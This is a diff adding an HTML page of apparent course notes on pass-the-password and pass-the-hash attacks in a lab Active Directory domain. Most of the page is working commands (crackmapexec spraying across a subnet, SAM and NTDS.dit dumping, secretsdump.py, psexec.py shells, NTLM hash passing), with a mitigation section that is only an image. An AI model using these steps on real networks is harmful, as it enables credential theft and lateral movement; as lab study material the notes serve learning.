@@ -1,0 +1,76 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Pass th Hash/Password</title>
+</head><body><img src="image.png" /><br/>
+crackmapexec to pass the username and password around the network<br/>
+<br/>
+#crackmapexec smb 192.168.57.0/24 -u facstle -d MARVEL.local -p P@ssword<br/>
+-u:the username to pass<br/>
+-p:the password associated to the username we pass<br/>
+-d:domain<br/>
+for ip we can use exact ip ofr CIDR notation<br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+we dont have smb access to Domain Controller(HYDRA) even though we have password and username<br/>
+<br/>
+do dump sam files or ntds.dit file form pwn3d machine use<br/>
+<br/>
+#crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p P@ssword --sam<br/>
+#crackmapexec smb 192.168.57.0/24 -u fcastle -d MARVEL.local -p P@ssword --ntds<br/>
+<br/>
+we can get a shell useing psexec.py<br/>
+<img src="image 3.png" /><br/>
+since we know fcastle is a user on the machine 192.168.57.18 from crackmapexec finding<br/>
+<br/>
+<br/>
+-------Dumping Hashes-----------------------------<br/>
+<br/>
+#secretsdump.py marvel.local/fcastle:P@ssword@192.168.57.17<br/>
+get sam hashes etc of 192.168.57.17<br/>
+<br/>
+<img src="image 4.png" /><br/>
+<br/>
+<br/>
+#secretsdump.py marvel.local/fcastle:P@ssword@192.168.57.18<br/>
+get sam hashes etc of 192.168.57.18<br/>
+(psexec.py and secretsdump.py have same syntax)<br/>
+<br/>
+<img src="image 5.png" /><br/>
+<br/>
+sam hashes are ntlm(not ntlmv2)<br/>
+Administrator passwrod same on both machine since they got same hash<br/>
+<img src="image 6.png" /><br/>
+<br/>
+<img src="image 7.png" /><br/>
+<br/>
+*****************NTLM hahses can be passed, NTLMV2 hashes cannot be passed*************************<br/>
+<br/>
+crack ntlm hashes with hashcat<br/>
+<br/>
+<img src="image 8.png" /><br/>
+<br/>
+cannot get password for 31d... which is of administrator<br/>
+<br/>
+copy second half of the hash<br/>
+<br/>
+first half is LM hash<br/>
+second half is NT hash<br/>
+<img src="image 9.png" /><br/>
+<br/>
+#crackmapexec smb 192.168.57.0/24 -u "Frank "Castle" -H &lt;hash&gt; --local-auth<br/>
+<br/>
+<img src="image 10.png" /><br/>
+<br/>
+---------Mitigation<br/>
+<br/>
+<br/>
+<img src="image 11.png" /><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
